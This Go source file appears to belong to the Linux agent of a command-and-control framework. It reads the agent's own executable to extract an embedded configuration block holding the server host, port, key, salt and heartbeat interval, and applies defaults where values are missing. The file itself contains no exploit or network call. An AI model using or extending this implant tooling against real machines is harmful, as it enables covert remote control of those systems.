//go:build linux

package linuxagent

import (
	"os"

	"c2/internal/c2embed"
)

// TryBootConfigFromExe 从 /proc/self/exe 解析 C2EMBED1 块（与 client C++/载荷修补布局一致）。
func TryBootConfigFromExe() (BootConfig, bool) {
	data, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return BootConfig{}, false
	}
	pv, _, err := c2embed.ParseFirst(data)
	if err != nil {
		return BootConfig{}, false
	}
	if !c2embed.ValidForBoot(pv) {
		return BootConfig{}, false
	}
	bc := BootConfig{
		ServerHost: pv.Host,
		ServerPort: pv.Port,
		VKey:       pv.VKey,
		Salt:       pv.Salt,
		WebHost:    pv.WebHost,
		WebPort:    pv.WebPort,
		HB:         pv.Heartbeat,
	}
	if bc.HB <= 0 {
		bc.HB = 30
	}
	if bc.WebHost == "" {
		bc.WebHost = "127.0.0.1"
	}
	if bc.WebPort <= 0 {
		bc.WebPort = 8080
	}
	return bc, true
}
